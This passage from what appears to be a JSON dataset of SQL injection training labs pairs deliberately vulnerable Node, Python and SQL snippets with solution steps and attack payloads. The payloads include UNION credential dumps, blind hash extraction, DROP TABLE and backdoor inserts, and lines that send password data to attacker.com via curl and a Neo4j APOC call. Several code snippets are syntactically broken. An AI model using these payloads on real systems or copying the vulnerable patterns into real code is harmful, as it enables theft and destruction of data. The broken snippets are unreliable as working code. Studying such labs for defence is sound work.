    "Lab Description": "A CSV export feature dynamically selects columns through user input without sanitization. This lab demonstrates injection through data export functionality. The challenge involves manipulating the column parameter to export sensitive user credentials in the CSV file.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject into export parameter: name UNION SELECT email,password FROM users--",
      "Download the generated CSV file",
      "Verify credential leakage",
      "Automate mass extraction",
      "Document the export attack vector"
    ],
    "Vulnerability name": "SQL Injection in CSV Export",
    "srcCode": "app.get('/export', (req, res) => {\n  const { column } = req.query;\n  const query = `SELECT ${column} FROM products`;\n  db.all(query, (err, rows) => {\n    res.type('text/csv').send(rows.map(r => r[column]).join('\\n'));\n  });\n});",
    "payloads": [
      "name UNION SELECT email,password FROM users--",
      "id,(SELECT GROUP_CONCAT(cc_number) FROM payments)--"
    ]
  },
  {
    "Lab scenario": "Password Reset Token Enumeration",
    "Lab Description": "A password reset system verifies tokens through vulnerable SQL queries. This lab demonstrates user enumeration through blind injection in security workflows. The challenge involves manipulating the token parameter to extract valid usernames from error responses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject into token parameter: fake' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
      "Analyze response differences for boolean testing",
      "Enumerate valid usernames through incremental testing",
      "Extract password hashes via stacked queries",
      "Document the reset workflow vulnerability"
    ],
    "Vulnerability name": "SQL Injection in Password Reset",
    "srcCode": "app.get('/reset', (req, res) => {\n  const { token } = req.query;\n  const query = `SELECT * FROM reset_tokens WHERE token='${token}'`;\n  db.get(query, (err, row) => {\n    if (row) res.send('Valid token');\n    else res.status(400).send('Invalid token');\n  });\n});",
    "payloads": [
      "fake' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
      "' UNION SELECT username FROM users--"
    ]
  },
  {
    "Lab scenario": "Time-Based Blind Injection in Analytics API",
    "Lab Description": "An analytics API provides no direct output but is vulnerable to time-based blind SQL injection. This lab demonstrates data extraction through timing delays when boolean conditions are met. The challenge involves extracting the admin password hash character-by-character using response timing analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable date range parameter",
      "Test time delay: 2023' AND IF(1=1,SLEEP(2),0)--",
      "Develop character extraction payload",
      "Automate hash extraction with incremental SUBSTRING tests",
      "Document the blind injection methodology"
    ],
    "Vulnerability name": "Time-Based Blind SQL Injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const { range } = req.query;\n  const query = `SELECT COUNT(*) FROM analytics WHERE period='${range}'`;\n  db.get(query, (err, row) => res.json(row));\n});",
    "payloads": [
      "2023' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50,SLEEP(2),0)--",
      "' UNION SELECT IF(1=1,BENCHMARK(10000000,MD5('test')),0)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Union Query",
    "Lab Description": "A GraphQL API implements custom resolvers that convert GraphQL queries to raw SQL. The union type implementation fails to properly sanitize type names, allowing injection into the generated SQL. The vulnerability exists in the resolver that handles polymorphic queries across multiple database tables. Attackers can exploit this to access restricted data models not normally exposed through the GraphQL schema.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema introspection to identify union types",
      "Craft a malicious __typename field with SQL injection payload",
      "Break GraphQL context with: `...on User { id } UNION SELECT password FROM admins--`",
      "Extract sensitive columns through type confusion",
      "Map entire database schema by exploiting the UNION vulnerability"
    ],
    "Vulnerability name": "GraphQL to SQL Injection",
    "srcCode": "const resolvers = {\n  UnionType: {\n    __resolveType(obj) {\n      const query = `SELECT type FROM ${obj.kind}_metadata WHERE id = '${obj.id}'`;\n      return db.query(query).then(res => res.rows[0].type);\n    }\n  }\n};",
    "payloads": [
      "{ search(term:\"test\") { __typename ...on User { id } UNION SELECT password FROM admins-- } }",
      "{ __schema { types { name fields { name } } }"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL Injection in Hybrid Document-Relational System",
    "Lab Description": "A document management system stores metadata in MongoDB but uses PostgreSQL for full-text search. The translation layer between document queries and SQL search queries improperly handles nested array operators, allowing injection into the generated SQL. The $elemMatch operator is particularly vulnerable as it gets converted to raw SQL without proper escaping of bracket notation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify MongoDB operators that get translated to SQL",
      "Craft malicious $elemMatch payload: `{ tags: { $elemMatch: { $eq: \"test\" } } }`",
      "Break NoSQL context with: `{ $elemMatch: { $eq: \"' UNION SELECT * FROM pg_catalog.pg_tables--\" } }`",
      "Exfiltrate relational data through document queries",
      "Compromise the join between document and relational systems"
    ],
    "Vulnerability name": "NoSQL to SQL Injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const mongoQuery = req.body.query;\n  const sql = convertMongoToSQL(mongoQuery);\n  db.query(`SELECT * FROM documents WHERE ${sql}`, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "{ $elemMatch: { $eq: \"' UNION SELECT version(),null--\" } }",
      "{ $where: \"function() { return SQL.execute('SELECT * FROM secrets'); }\" }"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Machine Learning Feature Store",
    "Lab Description": "A feature store for ML models dynamically generates SQL queries based on feature names. The query builder fails to properly escape feature names containing special characters, allowing injection into the training data retrieval pipeline. The vulnerability is particularly dangerous as it can expose PII used in model training that would otherwise be inaccessible through normal API endpoints.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify feature names used in model training API",
      "Craft malicious feature name: `valid_feature' UNION SELECT ssn FROM training_data--`",
      "Intercept feature retrieval request during model training",
      "Extract sensitive columns used as model features",
      "Map complete training data schema through incremental injection"
    ],
    "Vulnerability name": "ML Feature Store Injection",
    "srcCode": "def get_feature_values(feature_name):\n    query = f\"SELECT value FROM features WHERE name = '{feature_name}'\"\n    return db.execute(query).fetchall()",
    "payloads": [
      "age' UNION SELECT ssn FROM patients WHERE '1'='1",
      "income' FROM (SELECT * FROM sensitive_attributes) AS x--"
    ]
  },
  {
    "Lab scenario": "LDAP Filter to SQL Injection in HR System",
    "Lab Description": "An employee directory converts LDAP search filters to SQL queries for a hybrid authentication system. The translation fails to properly escape special characters in the LDAP filter syntax, allowing injection into the generated SQL. The vulnerability allows attackers to bypass both LDAP and SQL security controls by crafting malicious filters that modify the resulting query structure.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify LDAP filter parameters in employee search",
      "Craft malicious filter: `(uid=*))(mail=*)) OR 1=1--`",
      "Break LDAP context and inject SQL: `(uid=*))); SELECT * FROM hr.salaries--`",
      "Exfiltrate sensitive HR data through LDAP interface",
      "Bypass both LDAP and SQL access controls"
    ],
    "Vulnerability name": "LDAP to SQL Injection",
    "srcCode": "def ldap_to_sql(ldap_filter):\n    # Converts (uid=john) to SQL WHERE uid='john'\n    return re.sub(r'\\(([^=]+)=([^)]+)\\)', \"\\1='\\2'\", ldap_filter)\n\n@app.route('/search')\ndef search():\n    query = f\"SELECT * FROM employees WHERE {ldap_to_sql(request.args.get('filter'))}\"",
    "payloads": [
      "(uid=*)) OR 1=1--",
      "(objectClass=*)); INSERT INTO backdoor VALUES ('hacker')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Blockchain Smart Contract Event Processing",
    "Lab Description": "A blockchain indexer processes smart contract events and stores them in a SQL database. The event parameter parser fails to properly sanitize tuple types, allowing injection into the INSERT statements that store event data. This vulnerability can be exploited by emitting specially crafted events from a malicious smart contract to manipulate the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Deploy malicious smart contract with crafted events",
      "Emit event containing SQL payload: `('value'); DROP TABLE blocks;--`",
      "Monitor database for unexpected behavior",
      "Extract sensitive off-chain data stored by other contracts",
      "Compromise the bridge between blockchain and relational data"
    ],
    "Vulnerability name": "Blockchain to SQL Injection",
    "srcCode": "async function processEvent(event) {\n  const values = event.parameters.map(p => `'${p.value}'`).join(',');\n  await db.query(`INSERT INTO ${event.name}_events VALUES (${values})`);\n}",
    "payloads": [
      "('legit'); INSERT INTO backdoor VALUES (1,'attack')--",
      "('value'); SELECT private_keys FROM wallet_storage--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in IoT Device Firmware Update Verification",
    "Lab Description": "An IoT management platform verifies firmware updates by checking version numbers against a SQL database. The version comparison logic directly concatenates user-supplied version strings into the query. Attackers can exploit this by registering malicious firmware with version strings containing SQL payloads that execute when devices check for updates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register firmware with malicious version: `1.0'); DROP TABLE devices;--`",
      "Force IoT devices to check for updates",
      "Observe database changes from the payload execution",
      "Compromise the entire device fleet through update mechanism",
      "Establish persistent backdoor in update system"
    ],
    "Vulnerability name": "IoT Firmware SQL Injection",
    "srcCode": "def check_update(device_id, current_version):\n    query = f\"SELECT * FROM firmware WHERE device_type = '\n        (SELECT type FROM devices WHERE id = '{device_id}')\n        AND version > '{current_version}'\"\n    return db.execute(query).fetchone()",
    "payloads": [
      "1.0'); UPDATE devices SET config='malicious'--",
      "9.9' UNION SELECT 1,payload,3 FROM backdoors--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GeoJSON Feature Server",
    "Lab Description": "A geographic feature server accepts GeoJSON input that gets converted to SQL queries using PostGIS functions. The geometry coordinate array processing fails to properly sanitize numeric values, allowing injection into spatial queries. Attackers can exploit this by crafting malicious GeoJSON features that break out of the ST_GeomFromGeoJSON function context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GeoJSON ingestion endpoint",
      "Craft malicious coordinates: `[0,0]); SELECT * FROM sensitive_locations--`",
      "Break spatial function context with nested geometry",
      "Exfiltrate restricted geographic datasets",
      "Modify map data through UPDATE injection"
    ],
    "Vulnerability name": "GeoJSON to SQL Injection",
    "srcCode": "app.post('/features', (req, res) => {\n  const { geometry } = req.body;\n  const query = `INSERT INTO features (geom) VALUES \n    (ST_GeomFromGeoJSON('${JSON.stringify(geometry)}'))`;\n  db.query(query, (err) => {\n    res.send('Feature added');\n  });\n});",
    "payloads": [
      "{ \"type\":\"Point\", \"coordinates\":[0,0]); SELECT * FROM military_bases-- }",
      "{ \"type\":\"Polygon\", \"coordinates\":[[[0,0],[0,1],[1,1],[0,0]]] }; DELETE FROM cities--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Digital Signature Verification",
    "Lab Description": "A document signing system verifies digital signatures by querying a database of authorized signers. The verification query concatenates the raw signature value directly into the SQL statement. Attackers can exploit this by crafting malicious signatures that contain SQL payloads while still passing cryptographic verification through careful manipulation of signature components.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze signature verification process",
      "Craft signature containing SQL payload: `legit_sig' OR 1=1--`",
      "Bypass both cryptographic and SQL verification",
      "Extract private signing keys from database",
      "Forge documents as any authorized signer"
    ],
    "Vulnerability name": "Signature Verification SQLi",
    "srcCode": "def verify_document(doc_id, signature):\n    query = f\"SELECT * FROM signers WHERE \n        id = (SELECT signer_id FROM documents WHERE id = '{doc_id}')\n        AND public_key IN (SELECT key FROM keys WHERE sig = '{signature}')\"\n    return db.execute(query).fetchone()",
    "payloads": [
      "valid_sig' UNION SELECT 1,private_key,3 FROM signing_keys--",
      "' OR EXISTS(SELECT 1 FROM secret_signers)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Video Processing Metadata",
    "Lab Description": "A video processing pipeline stores frame metadata in a SQL database. The frame analysis endpoint accepts JSON metadata that gets directly embedded into INSERT statements. Attackers can exploit this by uploading videos with malicious metadata that injects SQL when frames are processed. The vulnerability is particularly dangerous as it executes in a backend worker process with elevated privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload video with malicious metadata: `{\"frame\":1,\"tags\":\"')); SELECT * FROM users--\"}`",
      "Wait for video processing job to execute",
      "Monitor database for injected query results",
      "Compromise worker process through SQL injection",
      "Establish persistence in processing pipeline"
    ],
    "Vulnerability name": "Video Metadata SQLi",
    "srcCode": "def process_frame(video_id, frame_data):\n    query = f\"INSERT INTO frames \n        (video_id, frame_num, tags) VALUES \n        ('{video_id}', {frame_data['frame']}, '{frame_data['tags']}')\"\n    db.execute(query)",
    "payloads": [
      "{\"frame\":1,\"tags\":\"')); SELECT password FROM admins--\"}",
      "{\"frame\":1,\"tags\":\"normal'); DROP TABLE videos;--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Voice Assistant Command Logging",
    "Lab Description": "A voice assistant system logs interpreted commands to a SQL database for analytics. The voice-to-text processor fails to properly sanitize special characters in commands before logging them. Attackers can exploit this by speaking carefully crafted commands that inject SQL when the logs are processed by administrative tools.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Issue voice command containing SQL payload: \"okay device ' OR 1=1--\"",
      "Wait for command to be processed and logged",
      "Trigger admin log review functionality",
      "Observe injected SQL execution in backend",
      "Exfiltrate voice command history through injection"
    ],
    "Vulnerability name": "Voice Command SQLi",
    "srcCode": "def log_command(user_id, command_text):\n    query = f\"INSERT INTO voice_logs \n        (user_id, command) VALUES \n        ('{user_id}', '{command_text}')\"\n    db.execute(query)",
    "payloads": [
      "\"set volume to 100 '); SELECT * FROM voice_history--\"",
      "\"what time is it ' UNION SELECT credit_card FROM payments--\""
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Node Resolution",
    "Lab Description": "A GraphQL API implements custom node resolution that dynamically builds SQL queries using unsanitized GraphQL ID values. The global ID pattern used for node references gets directly embedded into WHERE clauses, allowing injection through base64-encoded ID manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Query GraphQL endpoint for any node type",
      "Decode the returned base64 ID to understand the format",
      "Encode a malicious ID: base64('1 UNION SELECT password FROM users--')",
      "Use the forged ID in node queries to extract credentials",
      "Map database schema through type introspection"
    ],
    "Vulnerability name": "GraphQL Node ID Injection",
    "srcCode": "const resolvers = {\n  node: (_, { id }) => {\n    const rawId = Buffer.from(id, 'base64').toString();\n    return db.query(`SELECT * FROM nodes WHERE id = '${rawId.split(':')[1]}'`);\n  }\n};",
    "payloads": [
      "base64('user:1 UNION SELECT password FROM users--')",
      "base64('post:1' OR 1=1 LIMIT 1 OFFSET 1--)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JWT Claim Processing",
    "Lab Description": "An authentication system processes JWT claims by directly inserting them into SQL queries for permission checks. The 'role' claim from unsigned JWTs gets concatenated into authorization queries, allowing privilege escalation through crafted tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT and decode it",
      "Modify the role claim to: 'admin' OR 1=1--",
      "Re-sign with empty secret (none algorithm)",
      "Submit token in Authorization header",
      "Observe elevated permissions in response"
    ],
    "Vulnerability name": "JWT Claim Injection",
    "srcCode": "function checkPermission(jwt) {\n  const claims = jwt.verify(token, process.env.SECRET);\n  return db.query(`SELECT * FROM permissions WHERE role = '${claims.role}'`);\n}",
    "payloads": [
      "{\"role\":\"user' UNION SELECT 1,'admin'--\",\"iat\":1234567890}",
      "{\"role\":\"admin' OR '1'='1\",\"alg\":\"none\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MongoDB $where Clause to SQL Translation",
    "Lab Description": "A hybrid document-relational system translates MongoDB queries to SQL for cross-platform searches. The $where clause JavaScript gets converted to SQL without proper sanitization, allowing injection through specially crafted JavaScript expressions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify endpoints accepting MongoDB queries",
      "Craft $where clause: {\"$where\": \"this.id == '1' || SQL.execute('SELECT version()')\"}",
      "Observe database version in response",
      "Exfiltrate data through stacked queries",
      "Compromise the relational database backend"
    ],
    "Vulnerability name": "NoSQL-to-SQL Injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const mongoQuery = req.body;\n  const sql = convertMongoToSQL(mongoQuery);\n  db.query(sql, (err, results) => res.json(results));\n});",
    "payloads": [
      "{\"$where\": \"this.id == '1' || SQL.execute('SELECT * FROM users')\"}",
      "{\"$expr\": {\"$function\": {\"body\": \"function() { return SQL.execute('SHOW TABLES'); }\"}}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DynamoDB Stream Processor",
    "Lab Description": "A serverless function processes DynamoDB streams by converting item changes to SQL for a reporting database. The attribute value mapping fails to properly escape special characters, allowing injection through manipulated DynamoDB entries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Insert DynamoDB item with malicious attribute: {\"id\":{\"S\":\"1' OR 1=1--\"}}",
      "Trigger stream processing function",
      "Observe SQL query execution in logs",
      "Extract data through subsequent injections",
      "Compromise the reporting database"
    ],
    "Vulnerability name": "DynamoDB-to-SQL Injection",
    "srcCode": "exports.handler = async (event) => {\n  for (const record of event.Records) {\n    const id = record.dynamodb.NewImage.id.S;\n    await db.query(`UPDATE reports SET count = count + 1 WHERE id = '${id}'`);\n  }\n};",
    "payloads": [
      "{\"id\":{\"S\":\"1'; DROP TABLE reports--\"}}",
      "{\"id\":{\"S\":\"1' UNION SELECT password FROM users--\"}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Redis-to-SQL Caching Layer",
    "Lab Description": "A caching system stores SQL query results in Redis but reconstructs queries from cached patterns with user input. The query reconstruction fails to properly escape values retrieved from Redis, allowing injection through cache poisoning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify frequently cached queries",
      "Poison cache with malicious payload: {\"q\":\"SELECT * FROM products WHERE id = '1' OR 1=1--\"}",
      "Trigger cache hit with normal request",
      "Observe injected query execution",
      "Exfiltrate data through cache manipulation"
    ],
    "Vulnerability name": "Cache Reconstruction Injection",
    "srcCode": "async function getFromCache(key) {\n  const cached = await redis.get(key);\n  if (cached) {\n    return db.query(cached.query);\n  }\n  // ... cache miss logic\n}",
    "payloads": [
      "{\"query\":\"SELECT * FROM products WHERE id = '1' UNION SELECT * FROM users--\"}",
      "{\"query\":\"SELECT * FROM products WHERE id = '1'; SHUTDOWN--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL Plugin",
    "Lab Description": "An application uses Elasticsearch's SQL plugin for analytics, but passes user input directly to the SQL translation layer. The plugin's query builder fails to properly escape special characters in WHERE clauses, allowing injection through search parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify Elasticsearch SQL endpoints",
      "Inject through search parameter: q=1' OR 1=1--",
      "Observe unexpected results indicating injection",
      "Extract cluster information via SQL functions",
      "Access underlying document store"
    ],
    "Vulnerability name": "Elasticsearch SQL Injection",
    "srcCode": "app.get('/search', async (req, res) => {\n  const results = await esClient.sql.query({\n    query: `SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`\n  });\n  res.json(results);\n});",
    "payloads": [
      "' OR 1=1 LIMIT 100--",
      "' UNION SELECT version(), 1, 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Firebase Realtime Database Trigger",
    "Lab Description": "A Firebase function triggers on database writes to sync data to a SQL database. The path parameters used in the sync operation get directly embedded into SQL queries, allowing injection through manipulated database paths.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Write data to Firebase path: /users/1' OR 1=1--",
      "Trigger the sync function execution",
      "Observe SQL query in function logs",
      "Extract data through path manipulation",
      "Compromise the SQL database backend"
    ],
    "Vulnerability name": "Firebase Path Injection",
    "srcCode": "exports.syncUser = functions.database.ref('/users/{userId}').onWrite((snap, context) => {\n  const userId = context.params.userId;\n  return db.query(`UPDATE sql_users SET data = '${snap.val()}' WHERE id = '${userId}'`);\n});",
    "payloads": [
      "/users/1' OR 1=1--",
      "/users/1'; DROP TABLE sql_users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in OData Filter Parser",
    "Lab Description": "An OData API implementation converts $filter expressions to SQL without proper escaping. The parser fails to handle special characters in string literals, allowing injection through crafted filter expressions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OData $filter parameter",
      "Craft malicious filter: $filter=Name eq 'test' OR 1=1--",
      "Observe unfiltered results indicating injection",
      "Extract schema information via UNION",
      "Compromise the underlying database"
    ],
    "Vulnerability name": "OData Filter Injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const filter = odataToSql(req.query.$filter);\n  db.query(`SELECT * FROM products WHERE ${filter}`, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "Name eq 'test' OR 1=1--",
      "Name eq 'test' UNION SELECT name FROM sysobjects--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Kafka SQL Connector",
    "Lab Description": "A Kafka connector streams messages to a SQL database using configured field mappings. The message value deserializer fails to properly escape string values, allowing injection through crafted Kafka messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Produce Kafka message with malicious payload: {\"id\":\"1' OR 1=1--\"}",
      "Observe connector logs for SQL errors",
      "Craft messages to extract data via UNION",
      "Bypass consumer filtering",
      "Compromise the target database"
    ],
    "Vulnerability name": "Kafka-to-SQL Injection",
    "srcCode": "@KafkaListener(topics = \"orders\")\npublic void listen(Order order) {\n  jdbcTemplate.execute(\n    \"INSERT INTO orders VALUES('\" + order.getId() + \"')\"\n  );\n}",
    "payloads": [
      "{\"id\":\"1' OR 1=1--\"}",
      "{\"id\":\"1'; SELECT * FROM users--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Subscription Resolver",
    "Lab Description": "A GraphQL subscription resolver dynamically builds SQL queries for real-time updates using unsanitized subscription arguments. The resolver fails to properly escape arguments before embedding them in LIKE clauses for change detection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Subscribe to GraphQL subscription with malicious argument",
      "Payload: subscription { alerts(filter: \"test' OR 1=1--\") }",
      "Observe unexpected real-time events",
      "Extract data through timing attacks",
      "Compromise the real-time notification system"
    ],
    "Vulnerability name": "GraphQL Subscription Injection",
    "srcCode": "const resolvers = {\n  Subscription: {\n    alerts: {\n      subscribe: (_, { filter }) => {\n        return db.query(`SELECT * FROM alerts WHERE message LIKE '%${filter}%'`);\n      }\n    }\n  }\n};",
    "payloads": [
      "test' OR 1=1--",
      "' UNION SELECT password FROM users--"
    ]
  },

  {
    "Lab scenario": "SQL Injection in GraphQL Enum Type Resolution",
    "Lab Description": "A GraphQL API dynamically maps enum values to SQL queries without proper validation. Attackers can manipulate enum parameters in introspection queries to break out of the type system and execute arbitrary SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Query GraphQL schema to identify enum types",
      "Craft malicious enum value containing SQL payload",
      "Bypass type validation using null bytes",
      "Execute system commands through enum resolution",
      "Exfiltrate schema metadata through error messages"
    ],
    "Vulnerability name": "GraphQL Enum Injection",
    "srcCode": "const resolvers = {\n  Query: {\n    products(filter: {status: ProductStatus}) {\n      return db.query(`SELECT * FROM products WHERE status='${filter.status}'`)\n    }\n  }\n}",
    "payloads": [
      "AVAILABLE' UNION SELECT * FROM users--",
      "DISCONTINUED' FROM (SELECT * FROM admin_credentials) x--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JWT Key ID Header",
    "Lab Description": "A JWT verification system uses the key ID (kid) header to dynamically select database-stored keys. The kid parameter is concatenated directly into SQL queries, allowing injection through crafted token headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept JWT and decode header",
      "Modify kid to contain SQL payload",
      "Bypass signature verification",
      "Extract encryption keys from database",
      "Forge administrative tokens"
    ],
    "Vulnerability name": "JWT Key ID Injection",
    "srcCode": "function verifyJWT(token) {\n  const { header } = jwt.decode(token, { complete: true });\n  const key = db.query(`SELECT public_key FROM jwt_keys WHERE kid='${header.kid}'`);\n  return jwt.verify(token, key);\n}",
    "payloads": [
      "123' UNION SELECT 'malicious_key'--",
      "default' OR 1=1 LIMIT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Redis Time Series Filter",
    "Lab Description": "A Redis time series module converts TS.RANGE filters to SQL for hybrid queries. The filter parameter concatenation allows breaking out of Redis syntax into underlying SQL execution context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify Redis time series endpoints",
      "Craft malicious filter containing SQL payload",
      "Bypass Redis command validation",
      "Execute stacked queries through filter injection",
      "Exfiltrate data through timestamp manipulation"
    ],
    "Vulnerability name": "Redis-to-SQL Injection",
    "srcCode": "app.post('/metrics', (req, res) => {\n  redis.sendCommand(['TS.RANGE', 'temperatures', req.body.start, req.body.end, \n    'FILTER', `sensor_id=${req.body.sensor}`]);\n});",
    "payloads": [
      "1) AND (SELECT 1 FROM pg_sleep(5))--",
      "' OR (SELECT 1 FROM (SELECT version()) x)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Kafka Connect JDBC Sink",
    "Lab Description": "A Kafka Connect pipeline uses user-provided table names in JDBC sink configurations. The table name parameter is embedded directly into INSERT statements without sanitization, allowing injection through topic metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify Kafka Connect REST API endpoints",
      "Modify sink configuration with malicious table name",
      "Trigger message processing",
      "Bypass schema validation checks",
      "Compromise the entire JDBC sink"
    ],
    "Vulnerability name": "Kafka Connect SQLi",
    "srcCode": "{\n  \"name\": \"jdbc-sink\",\n  \"config\": {\n    \"connector.class\": \"io.confluent.connect.jdbc.JdbcSinkConnector\",\n    \"insert.mode\": \"insert\",\n    \"table.name.format\": \"${userTable}\"\n  }\n}",
    "payloads": [
      "legit_table\"); DROP TABLE users--",
      "metrics (SELECT * FROM sensitive_data) x--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL FDW Options",
    "Lab Description": "A multi-database system creates PostgreSQL foreign data wrappers with dynamic options. The option string concatenation allows injection during FDW server creation, compromising linked databases.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify FDW creation endpoints",
      "Inject through option parameters",
      "Bypass FDW syntax validation",
      "Execute commands on remote servers",
      "Pivot through database links"
    ],
    "Vulnerability name": "FDW Options Injection",
    "srcCode": "CREATE SERVER remote_db\nFOREIGN DATA WRAPPER postgres_fdw\nOPTIONS (\n  host '${req.body.host}',\n  dbname '${req.body.dbname}',\n  port '${req.body.port}'\n);",
    "payloads": [
      "host='attacker.com', dbname='test', port='5432')) RETURNS TABLE(cmd text) AS $$ BEGIN RETURN QUERY EXECUTE 'COPY (SELECT * FROM passwords) TO PROGRAM ''curl attacker.com'''; END; $$ LANGUAGE plpgsql--",
      "host='legit.db', dbname='test', port='5432' options='connect_timeout=30'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Function",
    "Lab Description": "A Snowflake data pipeline calls external functions with unsanitized parameters. The function arguments are concatenated directly into SQL queries, allowing injection through API gateway requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify external function calls",
      "Craft malicious argument containing SQL payload",
      "Bypass Snowflake parameter validation",
      "Execute commands in Snowflake context",
      "Exfiltrate data through function returns"
    ],
    "Vulnerability name": "Snowflake External Function Injection",
    "srcCode": "CREATE EXTERNAL FUNCTION process_data(arg STRING)\nRETURNS STRING\nAPI_INTEGRATION = api_integration\nAS 'https://api.example.com/process?param=${arg}'",
    "payloads": [
      "1' UNION SELECT * FROM information_schema.tables--",
      "legit' FROM (SELECT system$whitelist()) x--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver",
    "Lab Description": "An application uses Elasticsearch's SQL ODBC driver with user-provided query parameters. The parameter concatenation in the ODBC layer allows injection that bypasses Elasticsearch's normal security controls.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify Elasticsearch SQL ODBC connections",
      "Inject through query parameters",
      "Bypass Elasticsearch query DSL validation",
      "Access restricted indices",
      "Exfiltrate data through driver errors"
    ],
    "Vulnerability name": "Elasticsearch ODBC Injection",
    "srcCode": "SQLExecDirect(hstmt, \n  \"SELECT * FROM index WHERE field = '\" + userInput + \"'\", \n  SQL_NTS);",
    "payloads": [
      "1' OR '1'='1' LIMIT 100--",
      "test' FROM (SELECT * FROM sensitive_index) x--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MongoDB Change Stream",
    "Lab Description": "A change stream listener converts MongoDB change events to SQL inserts. The document field paths are concatenated directly into SQL without sanitization, allowing injection through crafted collection updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify collections with change streams",
      "Update documents with malicious field paths",
      "Trigger change stream processing",
      "Bypass document validation",
      "Execute arbitrary SQL through field names"
    ],
    "Vulnerability name": "Change Stream SQL Injection",
    "srcCode": "collection.watch().on('change', (change) => {\n  const query = `INSERT INTO audit_log VALUES('${change.documentKey._id}', \n    '${change.fullDocument.field}')`;\n  db.query(query);\n});",
    "payloads": [
      "{field: \"1' FROM (SELECT * FROM secrets) x--\"}",
      "{_id: 1, '\"); DROP TABLE audit_logs--': 'value'}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Neo4j Cypher to SQL Translation",
    "Lab Description": "A graph analytics platform converts Cypher queries to SQL for relational storage. The node property filters are concatenated directly into SQL, allowing injection through crafted MATCH clauses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify Cypher to SQL translation endpoints",
      "Craft malicious node property filter",
      "Bypass Cypher parser validation",
      "Execute arbitrary SQL through property values",
      "Exfiltrate graph data through SQL injection"
    ],
    "Vulnerability name": "Cypher-to-SQL Injection",
    "srcCode": "MATCH (n:User {name: '${userInput}'})\nRETURN n",
    "payloads": [
      "admin'})-[r]->(m) RETURN m UNION SELECT * FROM sql_users--",
      "test' OR 1=1 WITH n CALL apoc.load.jsonParams('http://attacker.com/?exfil=' + n.password, {}) YIELD value--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux Query",
    "Lab Description": "A monitoring system converts InfluxDB Flux queries to SQL for long-term storage. The Flux filter expressions are concatenated directly into SQL, allowing injection through crafted predicate functions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify Flux to SQL conversion endpoints",
      "Inject through filter() function parameters",
      "Bypass Flux syntax validation",
